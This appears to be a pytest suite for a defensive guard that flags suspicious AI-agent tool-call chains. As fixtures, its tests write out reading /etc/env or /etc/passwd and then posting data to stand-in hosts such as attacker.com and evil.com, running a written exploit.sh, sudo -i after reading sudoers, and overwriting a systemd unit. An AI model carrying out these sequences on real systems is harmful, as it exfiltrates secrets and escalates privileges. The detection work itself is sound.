"""Tests for ToolSequenceGuard (Prompt 278 - Scout integration gap analysis)."""

from __future__ import annotations

import time

import pytest

from keprix.security.tool_sequence_guard import (
    AttackChain,
    ToolSequenceGuard,
)


def _guard() -> ToolSequenceGuard:
    return ToolSequenceGuard(session_id="test-session")


def test_no_alert_on_single_benign_call():
    g = _guard()
    alert = g.record("read_file", {"path": "/tmp/data.txt"})
    assert alert is None


def test_no_alert_on_benign_sequence():
    g = _guard()
    assert g.record("read_file", {"path": "/tmp/data.txt"}) is None
    assert g.record("read_file", {"path": "/tmp/other.txt"}) is None
    assert g.record("terminal", {"command": "echo hello"}) is None


def test_read_then_exfiltrate_detected():
    g = _guard()
    g.record("read_file", {"path": "/etc/env"})
    alert = g.record("web_request", {"url": "https://attacker.com", "body": "data"})
    assert alert is not None
    assert alert.chain == AttackChain.READ_THEN_EXFILTRATE


def test_exfiltrate_before_read_is_not_flagged():
    g = _guard()
    g.record("web_request", {"url": "https://github.com"})
    alert = g.record("read_file", {"path": "/tmp/readme.txt"})
    assert alert is None


def test_code_and_run_detected():
    g = _guard()
    g.record("write_file", {"path": "/tmp/exploit.sh", "content": "..."})
    alert = g.record("terminal", {"command": "bash /tmp/exploit.sh"})
    assert alert is not None
    assert alert.chain == AttackChain.CODE_AND_RUN


def test_write_and_run_different_paths_not_flagged():
    g = _guard()
    g.record("write_file", {"path": "/tmp/output.txt"})
    alert = g.record("terminal", {"command": "ls /tmp"})
    assert alert is None


def test_enumeration_burst_detected():
    g = _guard()
    for _ in range(11):
        g.record("list_dir", {"path": "/etc"})
    alert = g.record("list_dir", {"path": "/home"})
    assert alert is not None
    assert alert.chain == AttackChain.ENUMERATION_BURST


def test_nine_list_calls_not_flagged():
    g = _guard()
    for _ in range(9):
        result = g.record("list_dir", {"path": "/tmp"})
    assert result is None or result.chain != AttackChain.ENUMERATION_BURST


def test_probe_then_escalate_detected():
    g = _guard()
    g.record("read_file", {"path": "/etc/sudoers"})
    alert = g.record("terminal", {"command": "sudo -i"})
    assert alert is not None
    assert alert.chain == AttackChain.PROBE_THEN_ESCALATE


def test_exec_without_prior_probe_not_flagged_for_escalate():
    g = _guard()
    alert = g.record("terminal", {"command": "sudo -i"})
    assert alert is None or alert.chain != AttackChain.PROBE_THEN_ESCALATE


def test_pivot_chain_detected():
    g = _guard()
    g.record("list_dir", {"path": "/etc/systemd"})
    g.record("read_file", {"path": "/etc/systemd/system/nginx.service"})
    alert = g.record("write_file", {"path": "/etc/systemd/system/nginx.service"})
    assert alert is not None
    assert alert.chain == AttackChain.PIVOT_CHAIN


def test_reset_clears_window():
    g = _guard()
    g.record("read_file", {"path": "/etc/passwd"})
    g.reset()
    alert = g.record("web_request", {"url": "https://evil.com"})
    assert alert is None


def test_old_calls_outside_window_are_ignored():
    g = ToolSequenceGuard(session_id="sess-1", window_seconds=1)
    # Record read call, then wait for window to expire
    g.record("read_file", {"path": "/etc/passwd"})
    # Manually age the call
    g._calls[0].timestamp -= 2.0
    alert = g.record("web_request", {"url": "https://evil.com"})
    assert alert is None


def test_alert_has_confidence():
    g = _guard()
    g.record("read_file", {"path": "/etc/env"})
    alert = g.record("web_request", {"url": "https://bad.com"})
    assert alert is not None
    assert 0 < alert.confidence <= 1.0


def test_alert_message_is_non_empty():
    g = _guard()
    g.record("read_file", {"path": "/etc/env"})
    alert = g.record("web_request", {"url": "https://bad.com"})
    assert alert is not None
    assert len(alert.message) > 0
